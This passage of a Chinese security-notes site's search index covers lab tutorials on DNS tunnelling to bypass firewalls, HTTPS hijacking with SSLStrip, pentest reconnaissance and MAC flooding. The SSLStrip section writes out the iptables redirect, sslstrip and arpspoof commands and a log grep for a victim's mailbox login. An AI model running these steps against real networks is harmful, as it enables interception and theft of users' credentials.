\u6d4b\u8bd5\u96a7\u9053\uff0c\u51fa\u73b0\u5982\u4e0b\u6548\u679c\u56fe\u4ee3\u8868\u6210\u529f DNS\u96a7\u9053\u6280\u672f\u5206\u6790 \u9996\u5148\u770b\u4e00\u4e0b\u6d41\u91cf\u5206\u6790\u7684\u56fe \u672c\u6587\u4e2d\u4ecb\u7ecd\u7684\u662fDNS\u96a7\u9053\u670d\u52a1\u5668\uff0c\u548cDNS\u96a7\u9053\u5ba2\u6237\u7aef\u662f\u540c\u4e00\u53f0\u673a\u5668\uff0c\u5e76\u4e0d\u80fd\u8bf4\u660e\u95ee\u9898\uff0c\u5f53DNS\u96a7\u9053\u670d\u52a1\u5668\u5b58\u5728\u4e8e\u9632\u706b\u5899\u4e4b\u540e\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u6b64\u79cd\u6280\u672f\u6765\u7ed5\u8fc7\u5927\u90e8\u5206\u7684\u9632\u706b\u5899\u3002\u5e76\u4e14\u53ef\u7ed5\u8fc7\u4e0d\u5f00\u7aef\u53e3\uff0c\u9690\u853d\u6027\u597d\u7b49\uff1b \u6784\u5efa\u4e00\u53f0\u65b0\u7684\u5ba2\u6237\u673a \u76ee\u6807\u670d\u52a1\u5668\uff08centos7\uff09\uff1a192.168.10.133 DNS\u96a7\u9053\u670d\u52a1\u7aef\uff08kali1\uff09\uff1a192.168.10.135 DNS\u96a7\u9053\u5ba2\u6237\u7aef\uff08kali2\uff09\uff1a192.168.10.134 DNS\u670d\u52a1\u5668\uff08Windows Server 2003\uff09\uff1a192.168.10.132 DNS\u96a7\u9053\u670d\u52a1\u5668\u6d41\u91cf\u56fe DNS\u96a7\u9053\u5ba2\u6237\u7aef\u6d41\u91cf\u56fe \u53d1\u73b0\u80fd\u591f\u76d1\u542c\u5230\u7684DNS\u96a7\u9053\u670d\u52a1\u5668\u4e0e\u76ee\u6807\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u662fSSH\u534f\u8bae\uff1b \u800cDNS\u96a7\u9053\u5ba2\u6237\u7aef\u4e0e\u76ee\u6807\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u662fDNS\u534f\u8bae\uff1b \u8fd9\u5c31\u662f\u7b80\u5355\u7684\u914d\u7f6eDNS\u96a7\u9053\uff1b","title":"DNS\u96a7\u9053\u6280\u672f"},{"location":"red_vs_blue/dns_tunnel/#dns","text":"\u96a7\u9053\u6280\u672f\uff08Tunneling\uff09\u662f\u4e00\u79cd\u901a\u8fc7\u4f7f\u7528\u4e92\u8054\u7f51\u7edc\u7684\u57fa\u7840\u8bbe\u65bd\u5728\u7f51\u7edc\u4e4b\u95f4\u4f20\u9012\u6570\u636e\u7684\u65b9\u5f0f\u3002\u4f7f\u7528\u96a7\u9053\u4f20\u9012\u7684\u6570\u636e\uff08\u6216\u8d1f\u8f7d\uff09\u53ef\u4ee5\u662f\u4e0d\u540c\u534f\u8bae\u7684\u6570\u636e\u5e27\u6216\u5305\u3002\u96a7\u9053\u534f\u8bae\u5c06\u5176\u5b83\u534f\u8bae\u7684\u6570\u636e\u5e27\u6216\u5305\u91cd\u65b0\u5c01\u88c5\u7136\u540e\u901a\u8fc7\u96a7\u9053\u53d1\u9001\u3002\u65b0\u7684\u5e27\u5934\u63d0\u4f9b\u8def\u7531\u4fe1\u606f\uff0c\u4ee5\u4fbf\u901a\u8fc7\u4e92\u8054\u7f51\u4f20\u9012\u88ab\u5c01\u88c5\u7684\u8d1f\u8f7d\u6570\u636e\u3002","title":"DNS\u96a7\u9053\u6280\u672f"},{"location":"red_vs_blue/dns_tunnel/#dns_1","text":"\u73af\u5883\uff1a\u653b\u51fb\u673a\uff08kali\uff09\u3001DNS\u670d\u52a1\u5668\uff08Windows Server 2003\uff09\u3001\u76ee\u6807\u670d\u52a1\u5668\uff08centos7\uff09","title":"\u5b9e\u73b0DNS\u96a7\u9053"},{"location":"red_vs_blue/dns_tunnel/#dns_2","text":"DNS\u670d\u52a1\u5668IP\uff1a192.168.10.132 \u65b0\u5efa\u4e00\u4e2a\u540d\u5b57\u4e3a\"bloodzero.com\"\u7684\u6b63\u5411\u89e3\u6790\u57df \u65b0\u5efa\u4e00\u4e2a\u4e3b\u673a\uff0cIP\u4e3a\u653b\u51fb\u673akali\u7684IP \u65b0\u5efa\u4e00\u4e2a\u59d4\u6258 DNS\u670d\u52a1\u5668\u5df2\u7ecf\u914d\u7f6e\u5b8c\u6210\u3002","title":"DNS\u670d\u52a1\u5668\u914d\u7f6e"},{"location":"red_vs_blue/dns_tunnel/#_1","text":"\u653b\u51fb\u673a\uff08kali\uff09IP\uff1a192.168.10.135 \u4fee\u6539dns2tcpd\u914d\u7f6e\u6587\u4ef6 resources\u7684IP\u4fee\u6539\u4e3a\u76ee\u6807\u670d\u52a1\u5668\u7684IP \u542f\u52a8DNS\u96a7\u9053\u7684\u670d\u52a1\u7aef \u5220\u9664ssh\u8fde\u63a5\u7684known_hosts\u6587\u4ef6 \u4fee\u6539DNS\u89e3\u6790\u6587\u4ef6\uff1avim /etc/resolv.conf \u914d\u7f6eDNS\u96a7\u9053\u5ba2\u6237\u7aef\u5448\u73b0\uff0c\u5728kali2.0\u4e2d\uff0c\u6ca1\u6709\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u81ea\u5df1\u624b\u5199\uff1avim /etc/dns2tcpc.conf \u6d4b\u8bd5\u96a7\u9053\uff0c\u51fa\u73b0\u5982\u4e0b\u6548\u679c\u56fe\u4ee3\u8868\u6210\u529f","title":"\u653b\u51fb\u673a\u914d\u7f6e"},{"location":"red_vs_blue/dns_tunnel/#dns_3","text":"\u9996\u5148\u770b\u4e00\u4e0b\u6d41\u91cf\u5206\u6790\u7684\u56fe \u672c\u6587\u4e2d\u4ecb\u7ecd\u7684\u662fDNS\u96a7\u9053\u670d\u52a1\u5668\uff0c\u548cDNS\u96a7\u9053\u5ba2\u6237\u7aef\u662f\u540c\u4e00\u53f0\u673a\u5668\uff0c\u5e76\u4e0d\u80fd\u8bf4\u660e\u95ee\u9898\uff0c\u5f53DNS\u96a7\u9053\u670d\u52a1\u5668\u5b58\u5728\u4e8e\u9632\u706b\u5899\u4e4b\u540e\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u5229\u7528\u6b64\u79cd\u6280\u672f\u6765\u7ed5\u8fc7\u5927\u90e8\u5206\u7684\u9632\u706b\u5899\u3002\u5e76\u4e14\u53ef\u7ed5\u8fc7\u4e0d\u5f00\u7aef\u53e3\uff0c\u9690\u853d\u6027\u597d\u7b49\uff1b \u6784\u5efa\u4e00\u53f0\u65b0\u7684\u5ba2\u6237\u673a \u76ee\u6807\u670d\u52a1\u5668\uff08centos7\uff09\uff1a192.168.10.133 DNS\u96a7\u9053\u670d\u52a1\u7aef\uff08kali1\uff09\uff1a192.168.10.135 DNS\u96a7\u9053\u5ba2\u6237\u7aef\uff08kali2\uff09\uff1a192.168.10.134 DNS\u670d\u52a1\u5668\uff08Windows Server 2003\uff09\uff1a192.168.10.132 DNS\u96a7\u9053\u670d\u52a1\u5668\u6d41\u91cf\u56fe DNS\u96a7\u9053\u5ba2\u6237\u7aef\u6d41\u91cf\u56fe \u53d1\u73b0\u80fd\u591f\u76d1\u542c\u5230\u7684DNS\u96a7\u9053\u670d\u52a1\u5668\u4e0e\u76ee\u6807\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\u662fSSH\u534f\u8bae\uff1b \u800cDNS\u96a7\u9053\u5ba2\u6237\u7aef\u4e0e\u76ee\u6807\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u662fDNS\u534f\u8bae\uff1b \u8fd9\u5c31\u662f\u7b80\u5355\u7684\u914d\u7f6eDNS\u96a7\u9053\uff1b","title":"DNS\u96a7\u9053\u6280\u672f\u5206\u6790"},{"location":"red_vs_blue/hijack_https/","text":"HTTPS\u52ab\u6301 sslstrip\u5b98\u7f51\u5730\u5740 sslstrip\u4e0b\u8f7d\u5730\u5740 SSL\u7406\u89e3 SSL\u662fSecure Socket Layer\u7684\u7b80\u79f0\uff0c \u4e2d\u6587\u610f\u601d\u662f\u5b89\u5168\u5957\u63a5\u5b57\u5c42\uff0c\u7531 NetScape\u516c\u53f8\u6240\u5f00\u53d1\uff0c\u7528\u4ee5\u4fdd\u969c\u5728Internet\u4e0a\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\uff0c\u786e\u4fdd\u6570\u636e\u5728\u7f51\u7edc\u7684\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u88ab\u622a\u53d6\u548c\u7a83\u542c\u3002 SSL\u534f\u8bae\u63d0\u4f9b\u7684\u670d\u52a1 \u8ba4\u8bc1\u7528\u6237\u548c\u670d\u52a1\u5668\uff0c\u786e\u4fdd\u6570\u636e\u53d1\u9001\u5230\u6b63\u786e\u7684\u5ba2\u6237\u548c\u670d\u52a1\u5668\u3002 \u52a0\u5bc6\u6570\u636e\u4ee5\u9632\u6b62\u6570\u636e\u4e2d\u9014\u88ab\u7a83\u53d6\u3002 \u7ef4\u62a4\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u786e\u4fdd\u6570\u636e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u88ab\u6539\u53d8\u3002 SSLStrip\u5de5\u4f5c\u539f\u7406 \u5148\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\u6765\u62e6\u622aHTTP\u6d41\u91cf\u3002 \u5c06\u51fa\u73b0\u7684 HTTPS \u94fe\u63a5\u5168\u90e8\u66ff\u6362\u4e3a HTTP,\u540c\u65f6\u8bb0\u4e0b\u6240\u6709\u6539\u53d8\u7684\u94fe\u63a5\u3002 \u4f7f\u7528HTTP\u4e0e\u53d7\u5bb3\u8005\u673a\u5668\u8fde\u63a5\u3002 \u540c\u65f6\u4e0e\u5408\u6cd5\u7684\u670d\u52a1\u5668\u5efa\u7acb HTTPS\u3002 \u53d7\u5bb3\u8005\u4e0e\u5408\u6cd5\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u5168\u90e8\u901a\u4fe1\u7ecf\u8fc7\u4e86\u4ee3\u7406\u8f6c\u53d1\u3002 \u5176\u4e2d\uff0c\u51fa\u73b0\u7684\u56fe\u6807\u88ab\u66ff\u6362\u6210\u4e3a\u7528\u6237\u719f\u6089\u7684\u201c\u5c0f\u9ec4\u9501\u201d\u56fe\u6807\uff0c\u4ee5\u5efa\u7acb\u4fe1\u4efb\u3002 \u8fd9\u6837\uff0c\u4e2d\u95f4\u4eba\u653b\u51fb\u5c31\u6210\u529f\u9a97\u53d6\u4e86\u5bc6\u7801\u3001\u8d26\u53f7\u7b49\u4fe1\u606f\uff0c\u800c\u53d7\u5bb3\u8005\u4e00\u65e0\u6240\u77e5\u3002 \u5229\u7528SSLStrip\u52ab\u6301https\u6d41\u91cf \u653b\u51fb\u8005\u542f\u52a8\u7f51\u5361\u6df7\u6742\u6a21\u5f0f\uff1aecho \"1\" /proc/sys/net/ipv4/ip_forward \u653b\u51fb\u8005\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\uff1aiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 9527 \u653b\u51fb\u8005\u5f00\u542fSSLStrip\uff1apython sslstrip.py -a -l 9527 -w sslstrip.log -a\uff1a\u8bb0\u5f55\u6240\u6709\u6765\u81ea\u670d\u52a1\u5668\u7684ssl\u548cHttp\u6570\u636e\u6d41\u91cf\u5185\u5bb9 -l\uff1a\u76d1\u542c\u7aef\u53e3 -w\uff1a\u4fdd\u5b58\u6587\u4ef6 \u653b\u51fb\u8005\u5f00\u542farp\u6b3a\u9a97\uff1aarpspoof -i eth0 -t ip(\u53d7\u5bb3\u673a) ip(\u7f51\u5173) \u53d7\u5bb3\u8005\u767b\u9646126\u90ae\u7bb1 \u653b\u51fb\u8005\u5728\u653b\u51fb\u673a\u4e0a\u67e5\u770b\u65e5\u5fd7\uff1acat sslstrip.log | grep \"\u90ae\u7bb1\u540d\"","title":"HTTPS\u52ab\u6301"},{"location":"red_vs_blue/hijack_https/#https","text":"sslstrip\u5b98\u7f51\u5730\u5740 sslstrip\u4e0b\u8f7d\u5730\u5740","title":"HTTPS\u52ab\u6301"},{"location":"red_vs_blue/hijack_https/#ssl","text":"SSL\u662fSecure Socket Layer\u7684\u7b80\u79f0\uff0c \u4e2d\u6587\u610f\u601d\u662f\u5b89\u5168\u5957\u63a5\u5b57\u5c42\uff0c\u7531 NetScape\u516c\u53f8\u6240\u5f00\u53d1\uff0c\u7528\u4ee5\u4fdd\u969c\u5728Internet\u4e0a\u6570\u636e\u4f20\u8f93\u7684\u5b89\u5168\uff0c\u786e\u4fdd\u6570\u636e\u5728\u7f51\u7edc\u7684\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u4f1a\u88ab\u622a\u53d6\u548c\u7a83\u542c\u3002","title":"SSL\u7406\u89e3"},{"location":"red_vs_blue/hijack_https/#ssl_1","text":"\u8ba4\u8bc1\u7528\u6237\u548c\u670d\u52a1\u5668\uff0c\u786e\u4fdd\u6570\u636e\u53d1\u9001\u5230\u6b63\u786e\u7684\u5ba2\u6237\u548c\u670d\u52a1\u5668\u3002 \u52a0\u5bc6\u6570\u636e\u4ee5\u9632\u6b62\u6570\u636e\u4e2d\u9014\u88ab\u7a83\u53d6\u3002 \u7ef4\u62a4\u6570\u636e\u7684\u5b8c\u6574\u6027\uff0c\u786e\u4fdd\u6570\u636e\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u4e0d\u88ab\u6539\u53d8\u3002","title":"SSL\u534f\u8bae\u63d0\u4f9b\u7684\u670d\u52a1"},{"location":"red_vs_blue/hijack_https/#sslstrip","text":"\u5148\u8fdb\u884c\u4e2d\u95f4\u4eba\u653b\u51fb\u6765\u62e6\u622aHTTP\u6d41\u91cf\u3002 \u5c06\u51fa\u73b0\u7684 HTTPS \u94fe\u63a5\u5168\u90e8\u66ff\u6362\u4e3a HTTP,\u540c\u65f6\u8bb0\u4e0b\u6240\u6709\u6539\u53d8\u7684\u94fe\u63a5\u3002 \u4f7f\u7528HTTP\u4e0e\u53d7\u5bb3\u8005\u673a\u5668\u8fde\u63a5\u3002 \u540c\u65f6\u4e0e\u5408\u6cd5\u7684\u670d\u52a1\u5668\u5efa\u7acb HTTPS\u3002 \u53d7\u5bb3\u8005\u4e0e\u5408\u6cd5\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u5168\u90e8\u901a\u4fe1\u7ecf\u8fc7\u4e86\u4ee3\u7406\u8f6c\u53d1\u3002 \u5176\u4e2d\uff0c\u51fa\u73b0\u7684\u56fe\u6807\u88ab\u66ff\u6362\u6210\u4e3a\u7528\u6237\u719f\u6089\u7684\u201c\u5c0f\u9ec4\u9501\u201d\u56fe\u6807\uff0c\u4ee5\u5efa\u7acb\u4fe1\u4efb\u3002 \u8fd9\u6837\uff0c\u4e2d\u95f4\u4eba\u653b\u51fb\u5c31\u6210\u529f\u9a97\u53d6\u4e86\u5bc6\u7801\u3001\u8d26\u53f7\u7b49\u4fe1\u606f\uff0c\u800c\u53d7\u5bb3\u8005\u4e00\u65e0\u6240\u77e5\u3002","title":"SSLStrip\u5de5\u4f5c\u539f\u7406"},{"location":"red_vs_blue/hijack_https/#sslstriphttps","text":"\u653b\u51fb\u8005\u542f\u52a8\u7f51\u5361\u6df7\u6742\u6a21\u5f0f\uff1aecho \"1\" /proc/sys/net/ipv4/ip_forward \u653b\u51fb\u8005\u6dfb\u52a0\u9632\u706b\u5899\u89c4\u5219\uff1aiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 9527 \u653b\u51fb\u8005\u5f00\u542fSSLStrip\uff1apython sslstrip.py -a -l 9527 -w sslstrip.log -a\uff1a\u8bb0\u5f55\u6240\u6709\u6765\u81ea\u670d\u52a1\u5668\u7684ssl\u548cHttp\u6570\u636e\u6d41\u91cf\u5185\u5bb9 -l\uff1a\u76d1\u542c\u7aef\u53e3 -w\uff1a\u4fdd\u5b58\u6587\u4ef6 \u653b\u51fb\u8005\u5f00\u542farp\u6b3a\u9a97\uff1aarpspoof -i eth0 -t ip(\u53d7\u5bb3\u673a) ip(\u7f51\u5173) \u53d7\u5bb3\u8005\u767b\u9646126\u90ae\u7bb1 \u653b\u51fb\u8005\u5728\u653b\u51fb\u673a\u4e0a\u67e5\u770b\u65e5\u5fd7\uff1acat sslstrip.log | grep \"\u90ae\u7bb1\u540d\"","title":"\u5229\u7528SSLStrip\u52ab\u6301https\u6d41\u91cf"},{"location":"red_vs_blue/information_collect/","text":"\u6e17\u900f\u7684\u672c\u8d28\u662f\u4fe1\u606f\u6536\u96c6 \u57df\u540d\u4fe1\u606f\u6536\u96c6 \u4e3b\u57df\u540d\u4fe1\u606f\u6536\u96c6 https\u8bc1\u4e66\u5185\u5bb9 \u5b50\u57df\u540d\u4fe1\u606f\u6536\u96c6 DNS\u89e3\u6790\u67e5\u8be2\uff1anslookup\u3001dig DNS\u533a\u57df\u4f20\u8f93\u6f0f\u6d1e \u7f51\u7ad9\u5730\u56fe\uff1asitemap.xml \u66b4\u529b\u7834\u89e3\u5de5\u5177\uff1aLayer\u5b50\u57df\u540d\u6316\u6398\u673a-\u6cd5\u5e08\u3001 subDomainsBrute-lijiejie \u3001 wydomain-\u732a\u732a\u4fa0 \u641c\u7d22\u5f15\u64ce\uff1aGoogle Hacking site:domain site:domain \u767b\u5f55 site:domain \u7ba1\u7406 site:domain login site:domain admin \u7f51\u7ad9\u4fe1\u606f\u6536\u96c6 \u7f51\u7ad9\u6307\u7eb9\u8bc6\u522b\uff1aCMS IP\u4fe1\u606f\u6536\u96c6 CDN IP\u4fe1\u606f \u5176\u5b83\u9632\u62a4IP\u4fe1\u606f\uff1a \u900f\u8fc7F5\u83b7\u53d6\u670d\u52a1\u5668\u771f\u5b9e\u5185\u7f51IP \u963f\u91cc\u4e91SLB IP\u4fe1\u606f \u963f\u91cc\u4e91\u5f39\u6027IP\u4fe1\u606f \u670d\u52a1\u5668\u7684\u771f\u5b9eIP\uff1a IP\u7684B\u6bb5\u4e0eC\u6bb5\uff1b \u670d\u52a1\u5668\u4fe1\u606f\u6536\u96c6 \u670d\u52a1\u5668\u7cfb\u7edf\u7248\u672c\u4fe1\u606f\uff1a \u670d\u52a1\u5668\u5f00\u653e\u7aef\u53e3\u4fe1\u606f\uff1a \u4e2d\u95f4\u4ef6\u7248\u672c\u4fe1\u606f\uff1a \u8d26\u53f7\u5bc6\u7801\u4fe1\u606f \u90ae\u7bb1\u3001\u5458\u5de5\u5de5\u53f7\u7f16\u7801\u89c4\u5219\uff1b \u9ed8\u8ba4\u5bc6\u7801\u4fe1\u606f\uff1a000000 111111 666666 888888\uff1b GitHub\u6cc4\u6f0f\u8d26\u53f7\u5bc6\u7801\u7b49\u4fe1\u606f\uff1b \u5386\u53f2\u6f0f\u6d1e\u4fe1\u606f \u4e4c\u4e91\u3001\u8865\u5929\u3001\u6f0f\u6d1e\u76d2\u5b50\u7b49\u51fa\u73b0\u8fc7\u7684\u5386\u53f2\u6f0f\u6d1e\u3002 \u5176\u5b83\u654f\u611f\u4fe1\u606f GitHub\u4ee3\u7801\u6cc4\u6f0f\uff1b \u654f\u611f\u6587\u4ef6\uff1a\u914d\u7f6e\u6587\u4ef6\u3001\u6570\u636e\u5e93\u5907\u4efd\u6587\u4ef6\u3001\u6e90\u7801\u6587\u4ef6\u3001SVN/GitLab\u9ed8\u8ba4\u6587\u4ef6\u5939\uff1b \u5b89\u5168\u9632\u62a4\u8bbe\u5907\u4fe1\u606f\uff1aWAF\u7248\u672c\u3001\u9632\u706b\u5899\u7248\u672c\uff1b","title":"\u6e17\u900f\u7684\u672c\u8d28\u662f\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_1","text":"","title":"\u6e17\u900f\u7684\u672c\u8d28\u662f\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_2","text":"","title":"\u57df\u540d\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_3","text":"https\u8bc1\u4e66\u5185\u5bb9","title":"\u4e3b\u57df\u540d\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_4","text":"DNS\u89e3\u6790\u67e5\u8be2\uff1anslookup\u3001dig DNS\u533a\u57df\u4f20\u8f93\u6f0f\u6d1e \u7f51\u7ad9\u5730\u56fe\uff1asitemap.xml \u66b4\u529b\u7834\u89e3\u5de5\u5177\uff1aLayer\u5b50\u57df\u540d\u6316\u6398\u673a-\u6cd5\u5e08\u3001 subDomainsBrute-lijiejie \u3001 wydomain-\u732a\u732a\u4fa0 \u641c\u7d22\u5f15\u64ce\uff1aGoogle Hacking site:domain site:domain \u767b\u5f55 site:domain \u7ba1\u7406 site:domain login site:domain admin","title":"\u5b50\u57df\u540d\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_5","text":"\u7f51\u7ad9\u6307\u7eb9\u8bc6\u522b\uff1aCMS","title":"\u7f51\u7ad9\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#ip","text":"CDN IP\u4fe1\u606f \u5176\u5b83\u9632\u62a4IP\u4fe1\u606f\uff1a \u900f\u8fc7F5\u83b7\u53d6\u670d\u52a1\u5668\u771f\u5b9e\u5185\u7f51IP \u963f\u91cc\u4e91SLB IP\u4fe1\u606f \u963f\u91cc\u4e91\u5f39\u6027IP\u4fe1\u606f \u670d\u52a1\u5668\u7684\u771f\u5b9eIP\uff1a IP\u7684B\u6bb5\u4e0eC\u6bb5\uff1b","title":"IP\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_6","text":"\u670d\u52a1\u5668\u7cfb\u7edf\u7248\u672c\u4fe1\u606f\uff1a \u670d\u52a1\u5668\u5f00\u653e\u7aef\u53e3\u4fe1\u606f\uff1a \u4e2d\u95f4\u4ef6\u7248\u672c\u4fe1\u606f\uff1a","title":"\u670d\u52a1\u5668\u4fe1\u606f\u6536\u96c6"},{"location":"red_vs_blue/information_collect/#_7","text":"\u90ae\u7bb1\u3001\u5458\u5de5\u5de5\u53f7\u7f16\u7801\u89c4\u5219\uff1b \u9ed8\u8ba4\u5bc6\u7801\u4fe1\u606f\uff1a000000 111111 666666 888888\uff1b GitHub\u6cc4\u6f0f\u8d26\u53f7\u5bc6\u7801\u7b49\u4fe1\u606f\uff1b","title":"\u8d26\u53f7\u5bc6\u7801\u4fe1\u606f"},{"location":"red_vs_blue/information_collect/#_8","text":"\u4e4c\u4e91\u3001\u8865\u5929\u3001\u6f0f\u6d1e\u76d2\u5b50\u7b49\u51fa\u73b0\u8fc7\u7684\u5386\u53f2\u6f0f\u6d1e\u3002","title":"\u5386\u53f2\u6f0f\u6d1e\u4fe1\u606f"},{"location":"red_vs_blue/information_collect/#_9","text":"GitHub\u4ee3\u7801\u6cc4\u6f0f\uff1b \u654f\u611f\u6587\u4ef6\uff1a\u914d\u7f6e\u6587\u4ef6\u3001\u6570\u636e\u5e93\u5907\u4efd\u6587\u4ef6\u3001\u6e90\u7801\u6587\u4ef6\u3001SVN/GitLab\u9ed8\u8ba4\u6587\u4ef6\u5939\uff1b \u5b89\u5168\u9632\u62a4\u8bbe\u5907\u4fe1\u606f\uff1aWAF\u7248\u672c\u3001\u9632\u706b\u5899\u7248\u672c\uff1b","title":"\u5176\u5b83\u654f\u611f\u4fe1\u606f"},{"location":"red_vs_blue/mac_flood/","text":"Mac\u5730\u5740\u6cdb\u6d2a\u653b\u51fb \u51e0\u4e2a\u6982\u5ff5 \u901a\u8fc7\u5411CAM\u8868\u4e2d\u5b58\u5165\u5927\u91cf\u7684\u865a\u5047mac\u5730\u5740\uff0c\u5bfc\u81f4cam\u8868\u4e0d\u80fd\u5b58\u6b63\u5e38\u7684\u4fe1\u606f\uff0c\u8fd9\u6837\u4ea4\u6362\u673a\u5728\u53d1\u9001\u6570\u636e\u5305\u65f6\u5c31\u4f1a\u5411\u5904\u4e8e\u4e00\u4e2avlan\u91cc\u7684\u6240\u6709\u673a\u5668\u90fd\u53d1\u9001\u6570\u636e\u5305\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u55c5\u63a2\u5c40\u57df\u7f51\u5185\u7684\u901a\u4fe1\uff1b unknown unicast\uff1a\u4e0d\u77e5\u9053\u76ee\u7684\u5730\u7684\u5355\u64ad\u5305\uff1b CAM\u8868\uff1a\u540c\u4e00\u4e2avlan\u4e2d\u4ea4\u6362\u673a\u5b58\u50a8mac\u5bf9\u5e94\u5730\u5740\u7684\u8868\uff1b \u5de5\u5177 dsniff \u9488\u5bf9\u7528\u6237\u5bc6\u7801\u7684\u4e00\u6b3e\u55c5\u63a2\u5de5\u5177 macof \u53d1\u8d77MAC\u5730\u5740\u6cdb\u6d2a\u7684\u5de5\u5177\uff0c\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\u5c06\u4ea4\u6362\u673a\u53d8\u6210\u4e86\u96c6\u7ebf\u5668\u3002 \u53ef\u4ee5\u7528\u6765\u4f7f\u4ea4\u6362\u673a\u7684MAC\u8868\u6ea2\u51fa\uff0c\u5bf9\u4e8e\u4ee5\u540e\u6536\u5230\u7684\u6570\u636e\u5305\u4ee5\u5e7f\u64ad\u65b9\u5f0f\u53d1\u9001\u3002\u6ce8\u610f\uff1a\u5728\u8fdb\u884c MAC \u6cdb\u6d2a\u4e4b\u524d\u5c31\u5b58\u5728\u4e8e\u4ea4\u6362\u673a MAC \u8868\u4e2d\u7684\u6761\u76ee\u4e0d\u4f1a\u88ab\u8986\u76d6\uff0c\u53ea\u80fd\u7b49\u5230\u8fd9\u4e9b\u6761\u76ee\u81ea\u7136\u8001\u5316\u3002 \u9a8c\u8bc1\uff1a\uff08\u5728\u653b\u51fb\u7684\u65f6\u5019\uff0cmacof\u5efa\u8bae\u5f00\u542f1\u4e2a\u52303\u4e2a\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u4e86\uff09 # \u5f00\u542f3\u4e2a\u7a97\u53e3\u5c31\u4ee3\u8868\u542f\u52a8\u4e863\u4e2a\u8fdb\u884c macof \u5907\u6ce8\uff1a\u865a\u62df\u673a\u4e2d\u9700\u8981\u8fd8\u539f\u9ed8\u8ba4\u8bbe\u7f6e\u624d\u4f1a\u6e05\u9664macof\u7684\u653b\u51fb\u6548\u679c","title":"Mac\u5730\u5740\u6cdb\u6d2a\u653b\u51fb"},{"location":"red_vs_blue/mac_flood/#mac","text":"","title":"Mac\u5730\u5740\u6cdb\u6d2a\u653b\u51fb"},{"location":"red_vs_blue/mac_flood/#_1","text":"\u901a\u8fc7\u5411CAM\u8868\u4e2d\u5b58\u5165\u5927\u91cf\u7684\u865a\u5047mac\u5730\u5740\uff0c\u5bfc\u81f4cam\u8868\u4e0d\u80fd\u5b58\u6b63\u5e38\u7684\u4fe1\u606f\uff0c\u8fd9\u6837\u4ea4\u6362\u673a\u5728\u53d1\u9001\u6570\u636e\u5305\u65f6\u5c31\u4f1a\u5411\u5904\u4e8e\u4e00\u4e2avlan\u91cc\u7684\u6240\u6709\u673a\u5668\u90fd\u53d1\u9001\u6570\u636e\u5305\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u5c31\u53ef\u4ee5\u55c5\u63a2\u5c40\u57df\u7f51\u5185\u7684\u901a\u4fe1\uff1b unknown unicast\uff1a\u4e0d\u77e5\u9053\u76ee\u7684\u5730\u7684\u5355\u64ad\u5305\uff1b CAM\u8868\uff1a\u540c\u4e00\u4e2avlan\u4e2d\u4ea4\u6362\u673a\u5b58\u50a8mac\u5bf9\u5e94\u5730\u5740\u7684\u8868\uff1b","title":"\u51e0\u4e2a\u6982\u5ff5"},{"location":"red_vs_blue/mac_flood/#_2","text":"","title":"\u5de5\u5177"},{"location":"red_vs_blue/mac_flood/#dsniff","text":"\u9488\u5bf9\u7528\u6237\u5bc6\u7801\u7684\u4e00\u6b3e\u55c5\u63a2\u5de5\u5177","title":"dsniff"},{"location":"red_vs_blue/mac_flood/#macof","text":"\u53d1\u8d77MAC\u5730\u5740\u6cdb\u6d2a\u7684\u5de5\u5177\uff0c\u901a\u4fd7\u6765\u8bf4\u5c31\u662f\u5c06\u4ea4\u6362\u673a\u53d8\u6210\u4e86\u96c6\u7ebf\u5668\u3002 \u53ef\u4ee5\u7528\u6765\u4f7f\u4ea4\u6362\u673a\u7684MAC\u8868\u6ea2\u51fa\uff0c\u5bf9\u4e8e\u4ee5\u540e\u6536\u5230\u7684\u6570\u636e\u5305\u4ee5\u5e7f\u64ad\u65b9\u5f0f\u53d1\u9001\u3002\u6ce8\u610f\uff1a\u5728\u8fdb\u884c MAC \u6cdb\u6d2a\u4e4b\u524d\u5c31\u5b58\u5728\u4e8e\u4ea4\u6362\u673a MAC \u8868\u4e2d\u7684\u6761\u76ee\u4e0d\u4f1a\u88ab\u8986\u76d6\uff0c\u53ea\u80fd\u7b49\u5230\u8fd9\u4e9b\u6761\u76ee\u81ea\u7136\u8001\u5316\u3002 \u9a8c\u8bc1\uff1a\uff08\u5728\u653b\u51fb\u7684\u65f6\u5019\uff0cmacof\u5efa\u8bae\u5f00\u542f1\u4e2a\u52303\u4e2a\u8fdb\u7a0b\u5c31\u53ef\u4ee5\u4e86\uff09 # \u5f00\u542f3\u4e2a\u7a97\u53e3\u5c31\u4ee3\u8868\u542f\u52a8\u4e863\u4e2a\u8fdb\u884c macof 